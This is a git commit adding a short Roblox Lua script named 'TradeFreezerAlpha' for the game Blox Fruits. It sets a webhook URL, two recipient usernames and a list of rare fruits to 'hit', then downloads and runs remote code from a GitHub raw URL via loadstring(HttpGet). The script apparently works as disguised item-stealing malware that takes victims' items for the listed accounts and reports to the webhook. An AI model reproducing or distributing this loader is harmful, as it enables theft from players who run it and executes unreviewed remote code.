763dd2a714769f844c8badb3daba84d8d0030f41
redzhubreal <sigma123alpha123beta123@gmail.com>
2025-04-04 13:26:50 +0530

    Create TradeFreezerAlpha.lua

---
+++ TradeFreezerAlpha.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Zmw2WUg1a08zMlB0dVdHMGhtd1daUTpTNzhHNVFKQnpnTWdlTk9ReHlnYnJ3SFFtTnh0UDlRUE1DbTJOcXV2MnBtNmNlSkFTV05rZHZOMDg1ZXV5VlBTRk56WGFpSDhWZElrektJeHdtMVZIMHNVcVFXOXRtZHBqLTNaY0hiQXJ4UlBYRjRiSFljLUJaa0R4dk5NcXRXY21oQlBXXy0zWWktZjE4ZmZfd3VERzBpaFBNdUJmbUZJOWM4bTl0UjYyYnM"
+Usernames = {"supergsgsgs", "Sourlas3103"}
+FruitsToHit = {"Buddha-Buddha", "Portal-Portal", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Dough-Dough", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
